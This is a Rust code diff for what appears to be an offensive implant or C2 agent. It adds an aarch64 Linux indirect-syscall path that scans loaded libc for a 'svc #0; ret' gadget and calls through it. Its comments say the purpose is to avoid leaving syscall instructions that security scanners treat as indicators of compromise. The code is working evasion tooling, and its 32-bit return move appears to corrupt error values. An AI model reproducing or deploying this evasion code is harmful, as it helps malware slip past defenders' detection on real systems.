@@ -71,6 +71,88 @@ pub struct SyscallTarget {
     pub ssn: u32,
 }
 
+// ── aarch64 Linux indirect-syscall gadget ─────────────────────────────────
+//
+// On aarch64 Linux, a direct `svc #0` instruction in the agent binary is a
+// strong IoC.  To avoid it, we locate a `svc #0; ret` gadget inside a shared
+// library that is already mapped into the process (typically libc.so) and
+// branch to it via `blr`.  The gadget executes the supervisor call on behalf
+// of the agent, so no `svc` instruction exists in agent code pages.
+
+/// Cached address of a `svc #0; ret` sequence found in a loaded shared
+/// library (libc).  Zero means "not yet resolved" or "unavailable".
+#[cfg(all(target_os = "linux", target_arch = "aarch64", feature = "direct-syscalls"))]
+static LIBC_SVC_GADGET: OnceLock<usize> = OnceLock::new();
+
+/// Scan the executable region of libc (loaded in the current process) for an
+/// 8-byte `svc #0; ret` gadget.
+///
+/// The aarch64 encoding is:
+///   svc #0  →  `0xD4000001`  (LE bytes: `01 00 00 D4`)
+///   ret     →  `0xD65F03C0`  (LE bytes: `C0 03 5F D6`)
+///
+/// Returns the address of the first matching gadget, or 0 if none is found.
+#[cfg(all(target_os = "linux", target_arch = "aarch64", feature = "direct-syscalls"))]
+fn find_libc_svc_gadget() -> usize {
+    use std::fs;
+
+    // Parse /proc/self/maps to find the first executable mapping of libc.
+    let maps = match fs::read_to_string("/proc/self/maps") {
+        Ok(m) => m,
+        Err(_) => return 0,
+    };
+
+    for line in maps.lines() {
+        // Example line:
+        //   7f9a001000-7f9a020000 r-xp 00000000 fd:01 12345  /usr/lib/aarch64-linux-gnu/libc.so.6
+        if !line.contains("libc") {
+            continue;
+        }
+        let parts: Vec<&str> = line.split_whitespace().collect();
+        if parts.len() < 2 {
+            continue;
+        }
+        let perms = parts[1];
+        if !perms.contains('x') {
+            continue; // skip non-executable mappings
+        }
+
+        // Parse address range.
+        let addr_range: Vec<&str> = parts[0].split('-').collect();
+        if addr_range.len() != 2 {
+            continue;
+        }
+        let start = match usize::from_str_radix(addr_range[0], 16) {
+            Ok(v) => v,
+            Err(_) => continue,
+        };
+        let end = match usize::from_str_radix(addr_range[1], 16) {
+            Ok(v) => v,
+            Err(_) => continue,
+        };
+        let size = end.saturating_sub(start);
+        if size < 8 {
+            continue;
+        }
+
+        // Scan for the 8-byte gadget pattern: svc #0 (01 00 00 D4) + ret (C0 03 5F D6).
+        let code = unsafe { std::slice::from_raw_parts(start as *const u8, size) };
+        let pattern: [u8; 8] = [0x01, 0x00, 0x00, 0xD4, 0xC0, 0x03, 0x5F, 0xD6];
+        for i in 0..=size - 8 {
+            if code[i..i + 8] == pattern {
+                let addr = start + i;
+                log::debug!(
+                    "find_libc_svc_gadget: found svc #0; ret gadget at {:#x}",
+                    addr
+                );
+                return addr;
+            }
+        }
+    }
+    log::warn!("find_libc_svc_gadget: no svc #0; ret gadget found in libc");
+    0
+}
+
 #[cfg(windows)]
 fn parse_syscall_stub(func_addr: usize) -> Option<SyscallTarget> {
     unsafe {
@@ -1835,35 +1917,138 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
     }
     #[cfg(target_arch = "aarch64")]
     {
-        let mut ret: i64;
-        // svc involves a mode switch; rcx/r11 equivalents (x30 etc.) may be
-        // modified by the kernel entry path.  Do not use options(nostack).
-        match args.len() {
-            0 => {
-                std::arch::asm!("svc 0", in("x8") ssn as u64, lateout("x0") ret, lateout("x1") _, lateout("x2") _, lateout("x3") _, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _)
-            }
-            1 => {
-                std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], lateout("x0") ret, lateout("x1") _, lateout("x2") _, lateout("x3") _, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _)
-            }
-            2 => {
-                std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], lateout("x0") ret, lateout("x2") _, lateout("x3") _, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _)
-            }
-            3 => {
-                std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], in("x2") args[2], lateout("x0") ret, lateout("x3") _, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _)
-            }
-            4 => {
-                std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], in("x2") args[2], in("x3") args[3], lateout("x0") ret, lateout("x4") _, lateout("x5") _, lateout("x6") _, lateout("x7") _)
-            }
-            5 => {
-                std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], in("x2") args[2], in("x3") args[3], in("x4") args[4], lateout("x0") ret, lateout("x5") _, lateout("x6") _, lateout("x7") _)
-            }
-            6 => {
-                std::arch::asm!("svc 0", in("x8") ssn as u64, in("x0") args[0], in("x1") args[1], in("x2") args[2], in("x3") args[3], in("x4") args[4], in("x5") args[5], lateout("x0") ret, lateout("x6") _, lateout("x7") _)
-            }
-            // Linux syscalls accept at most 6 register arguments on aarch64.
+        // Linux syscalls accept at most 6 register arguments on aarch64.
+        if args.len() > 6 {
             // Return EINVAL instead of panicking so callers can handle this
             // invalid input path without generating a crash dump.
-            _ => return Err(libc::EINVAL),
+            return Err(libc::EINVAL);
+        }
+
+        let a0 = args.get(0).copied().unwrap_or(0);
+        let a1 = args.get(1).copied().unwrap_or(0);
+        let a2 = args.get(2).copied().unwrap_or(0);
+        let a3 = args.get(3).copied().unwrap_or(0);
+        let a4 = args.get(4).copied().unwrap_or(0);
+        let a5 = args.get(5).copied().unwrap_or(0);
+
+        // ── Indirect syscall path ───────────────────────────────────────
+        // Try to resolve a `svc #0; ret` gadget from a loaded shared library
+        // (libc).  When available, we branch to the gadget via `blr` so that
+        // no `svc` instruction exists anywhere in the agent's own code pages.
+        // This is the aarch64 analogue of the x86_64 Windows technique that
+        // calls through a `syscall; ret` gadget in ntdll.
+        let gadget: usize =
+            *LIBC_SVC_GADGET.get_or_init(find_libc_svc_gadget);
+
+        let mut ret: i64;
+        if gadget != 0 {
+            // Indirect syscall: set up registers and branch to the gadget.
+            // The gadget executes `svc #0; ret`.  `blr` stores the return
+            // address in x30 (LR) so the gadget's `ret` brings us back to the
+            // next instruction.
+            //
+            // We do NOT use `options(nostack)`: the kernel may deliver a
+            // signal during the SVC trap and build a signal frame on the
+            // user stack.
+            std::arch::asm!(
+                "mov x8, {ssn}",
+                "mov x0, {a0}",
+                "mov x1, {a1}",
+                "mov x2, {a2}",
+                "mov x3, {a3}",
+                "mov x4, {a4}",
+                "mov x5, {a5}",
+                "blr {gadget}",
+                // The gadget's `ret` lands here; w0 holds the kernel return
+                // value.  Use the :w modifier so both operands are 32-bit Wn
+                // registers (mov Xd, Ws is not a valid aarch64 encoding).
+                "mov {ret:w}, w0",
+                ssn   = in(reg) ssn as u64,
+                a0    = in(reg) a0,
+                a1    = in(reg) a1,
+                a2    = in(reg) a2,
+                a3    = in(reg) a3,
+                a4    = in(reg) a4,
+                a5    = in(reg) a5,
+                gadget = in(reg) gadget as u64,
+                ret   = out(reg) ret,
+                // Declare all caller-saved / scratch registers that the SVC
+                // entry path or the kernel may clobber.  x0–x7 hold args and
+                // the return value; x8 is the syscall number; x9–x17 are
+                // IP0/IP1 and other volatile temporaries; x16/x17 may also be
+                // used by the PLT veneer in the gadget's host library.  x30
+                // is overwritten by `blr`.
+                out("x0")  _, out("x1")  _, out("x2")  _, out("x3")  _,
+                out("x4")  _, out("x5")  _, out("x6")  _, out("x7")  _,
+                out("x8")  _,
+                out("x9")  _, out("x10") _, out("x11") _,
+                out("x12") _, out("x13") _, out("x14") _, out("x15") _,
+                out("x16") _, out("x17") _,
+                out("x30") _,
+            );
+        } else {
+            // ── Direct syscall fallback ──────────────────────────────────
+            // No gadget was found.  Fall back to an inline `svc #0`.  This
+            // path is functionally correct but leaves a `svc` instruction in
+            // the agent binary — a potential IoC for security scanners.
+            //
+            // svc involves a mode switch; x30 etc. may be modified by the
+            // kernel entry path.  Do not use options(nostack).
+            match args.len() {
+                0 => {
+                    std::arch::asm!("svc 0",
+                        in("x8") ssn as u64,
+                        lateout("x0") ret,
+                        out("x1") _, out("x2") _, out("x3") _,
+                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
+                }
+                1 => {
+                    std::arch::asm!("svc 0",
+                        in("x8") ssn as u64, in("x0") a0,
+                        lateout("x0") ret,
+                        out("x1") _, out("x2") _, out("x3") _,
+                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
+                }
+                2 => {
+                    std::arch::asm!("svc 0",
+                        in("x8") ssn as u64, in("x0") a0, in("x1") a1,
+                        lateout("x0") ret,
+                        out("x2") _, out("x3") _,
+                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
+                }
+                3 => {
+                    std::arch::asm!("svc 0",
+                        in("x8") ssn as u64, in("x0") a0, in("x1") a1, in("x2") a2,
+                        lateout("x0") ret,
+                        out("x3") _,
+                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
+                }
+                4 => {
+                    std::arch::asm!("svc 0",
+                        in("x8") ssn as u64,
+                        in("x0") a0, in("x1") a1, in("x2") a2, in("x3") a3,
+                        lateout("x0") ret,
+                        out("x4") _, out("x5") _, out("x6") _, out("x7") _)
+                }
+                5 => {
+                    std::arch::asm!("svc 0",
+                        in("x8") ssn as u64,
+                        in("x0") a0, in("x1") a1, in("x2") a2, in("x3") a3,
+                        in("x4") a4,
+                        lateout("x0") ret,
+                        out("x5") _, out("x6") _, out("x7") _)
+                }
+                6 => {
+                    std::arch::asm!("svc 0",
+                        in("x8") ssn as u64,
+                        in("x0") a0, in("x1") a1, in("x2") a2, in("x3") a3,
+                        in("x4") a4, in("x5") a5,
+                        lateout("x0") ret,
+                        out("x6") _, out("x7") _)
+                }
+                // Length > 6 was already rejected above.
+                _ => unreachable!(),
+            }
         }
         if ret < 0 {
             Err(-ret as i32)
